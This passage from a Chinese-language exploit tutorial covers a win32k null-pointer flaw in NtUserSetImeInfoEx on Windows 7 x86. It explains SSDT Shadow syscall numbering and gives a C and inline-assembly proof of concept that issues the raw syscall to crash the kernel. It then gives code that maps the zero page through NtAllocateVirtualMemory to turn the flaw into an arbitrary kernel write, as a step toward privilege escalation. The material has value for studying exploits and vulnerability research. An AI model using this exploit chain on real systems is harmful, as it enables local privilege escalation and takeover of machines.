    {
        PULONG ServiceTableBase;// 指向函数地址的指针，每个成员占4字节
        PULONG ServiceCounterTableBase;// 当前系统服务表被调用的次数
        ULONG NumberOfService;// 服务函数的数量
        PUCHAR ParamTableBase;// 服务函数的参数总长度，以字节为单位，每个成员占一个字节
    } SSDTEntry, *PSSDTEntry;
在ServiceTableBase中，记录了第一个内核方法的内存地址，而该内存地址指向了不同的内核函数，其中，通过地址的偏移，我们可以遍历得到SSDT所记录的所有内核函数的内存地址（仅包含用户模式最常用的内核函数，并非囊括全部内核函数）
回归正题，我们在Win7 x86的环境下打开PChunter，点击内核钩子-ShadowSSDT，通过翻找可以查阅到我们所需调用的NtUserSetImeInfoEX的编号为550。
在每个Windows系统版本中，为了保持系统稳定可用，内核函数在系统服务描述表的排列顺序都是不变的，我们在Win7
x86的环境下打开PChunter，点击内核钩子-ShadowSSDT，通过翻找可以查阅到我们所需调用的NtUserSetImeInfoEX的编号为550。而550就是该内核方法的调用号。
WindowsNT基本的系统native调用有两百多个，而记录在SSDT中的内核函数，编号都小于0x1000，编号大于0x1000的系统调用号是微软扩展出来的。
而扩展出来的系统调用号用于动态安装的模块win32k.sys，记录在SSDTShadow，由于我们需调用的NTUserSetImeInfoEx属于win32k.sys，是扩展出来的系统调用号，因此将550转化为16进制为0x0226后，还需要添加0x1000的起始偏移，因此NtUserSetImeInfoE方法的内存地址偏移量为0x1226。
想要进一步了解系统服务调用和SSDT、SSDTShadow之间的过程和联系，可以查阅：https://blog.csdn.net/qq_41988448/article/details/102994374
### **（四）系统调用**
想要通过系统服务调用号来调用系统服务，我们需要通过快速系统调用的方式进行调用，也就是KiFastSystemCall，而每个Windows版本中，快速系统调用函数的内存地址是固定不变的，记录在UserSharedData!SystemCallSutb当中，而在Win7
x86中，系统快速调用函数的内存地址为“0x7ffe0300”
Q：什么是系统调用？
A：系统调用，顾名思义，说的是操作系统提供给用户程序调用的一组“特殊”接口。用户程序可以通过这组“特殊”接口来获得操作系统内核提供的服务。从逻辑上来说，系统调用可被看成是一个内核与用户空间程序交互的接口——它好比一个中间人，把用户进程的请求传达给内核，待内核把请求处理完毕后再将处理结果送回给用户空间
Q：快速系统调用跟系统调用是什么关系？
A：快速系统调用是系统调用的一种。
Q：为何要通过系统调用方法来进行调用？
A：无论何时用户态线程调用系统服务，线程都将突然被允许运行特权操作系统代码。这对于操作系统来说是很不友好的。用户态线程可能破坏系统的数据结构或在内存中移动一些内容，对系统和用户产生巨大破坏。正因为如此，处理器通常提供一条只用于系统服务的特殊指令，而这条指令就是系统调用。
### **（五）编写poc**
打开Visual
Studio，使用汇编语言编写调用NtSetUserImeInfoEx方法，其中“0x1226”为NtUserSetImeInfoEx方法的地址偏移，“0x7ffe0300”为内存地址固定的UserSharedData!SystemCallSutb，快速系统调用函数的地址，下面汇编语义就是将调用号作为快速系统调用的参数，由快速系统调用函数查找调用号对应的内核函数，并进行调用。
    __declspec(naked) void NtSetUserImeInfoEx(char* arg1)
    {
    __asm
    {
    mov eax, 0x1226;
    mov edx, 0x7ffe0300;
    call dword ptr[edx];
    ret 0x04
    }
    }
__declspec(naked)是用来告诉编译器函数代码的汇编语言为自己的所写，不需要编译器添加任何汇编代码，通俗说可生成纯汇编。
官方解释：For functions declared with the naked attribute, the compiler generates
code without prolog and epilog code. You can use this feature to write your
own prolog/epilog code sequences using inline assembler code. Naked functions
are particularly useful in writing virtual device drivers. Note that the naked
attribute is only valid on x86, and is not available on x64 or
Itanium.(混合汇编编写代码仅支持生成x86应用)
整合起来为：
    #include 
    __declspec(naked) void NtSetUserImeInfoEx(char* arg1)
    {
    __asm
    {
    mov eax, 0x1226;
    mov edx, 0x7ffe0300;
    call dword ptr[edx];
    ret 0x04
    }
    }
    int main()
    {
    HWINSTA hStation = CreateWindowStation(0, 0, READ_CONTROL, 0);
    SetProcessWindowStation(hStation);
    char ime[0x800];
    NtSetUserImeInfoEx(ime);
    return 0;
    }
编译成exe丢到Win7
x86虚拟机中执行，由于调用系统服务时产生了模式切换，进入了内核态，在内核态中，对空指针进行操作，进而触发了蓝屏。而在用户模式下对空指针进行操作，只会返回程序错误。
蓝屏触发，说明触发了空指针引用，定位到漏洞点。
### **（六）零页内存以及空指针赋值分区**
在《Windows核心编程》关于内存结构的章节中指出：Windows系统存在空指针赋值分区，其范围从0x00000000至0x0000FFFF，由于这部分内存位于地址空间的最开始，因此也称之为零页内存，这段内存空间是空闲的，没有相应的物理存储器与之对应，因此对于这段空间而言，任何的读写操作都会造成异常。
在内核态会触发蓝屏，在用户态会触发程序错误。由于一个内存地址存储空间为1字节，由0x0000FFFF为65536此处为64kB。
Q：是否空指针分区或者零页内存就无法使用呢？
A：非也，通过调用ntdll.dll的NtAllocateVirtualMemory函数，通过特殊的小技巧，可以在零页内存分配内存空间，使得NULL指针可读，不会报错。
    // 定义NtAllocateVirtualMemory函数结构
    typedef NTSTATUS(__stdcall *MyNtAllocate)(
    HANDLE   ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T  RegionSize,
    ULONG    AllocationType,
    ULONG    Protect
    );
    MyNtAllocate fun;
    PVOID baseAddr = (PVOID)0x100; //以0x100作为起始地址
    DWORD size = 0x1000; // 分配页面大小为4KB
    fun = (MyNtAllocate)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    if (fun == NULL)
    {
    printf("[-] fail to GetAddress");
    exit(-1);
    }
    fun(GetCurrentProcess(),&baseAddr,0,&size,MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);//分配内存空间
对于Windows系统，在进程的虚拟空间申请一块内存时，该块内存默认为64KB大小对齐（分配内存的起始地址必须为64KB的整数倍），因此，当我们设置分配内存的起始地址为0x00000100时，系统会强制决定起始地址为0x00000000，由于我们分配页面大小选择4KB，因此分配得到的内存空间为0x00000000~0x00001FFF。
当完成内存空间分配后，原本的空指针赋值分区可读可写，所有当再次调用SetImeInfoEX方法时，便不再会触发蓝屏（蓝屏是因为对于零页内存的任意读写都会报错）。
至此，我们通过在用户态R3的程序中通过分配内存空间，设置内存数据，最终控制SetImeInfoEx函数中v3的取值，进而可以控制其随后在21行调用的qmemcpy(v4,
a2, 0x15Cu);，达到任意地址写入的目的。
## 三、后续
结合本次内容，下一篇将结合BitMap技术，将任意地址写入，转化任意地址读写。
50加成券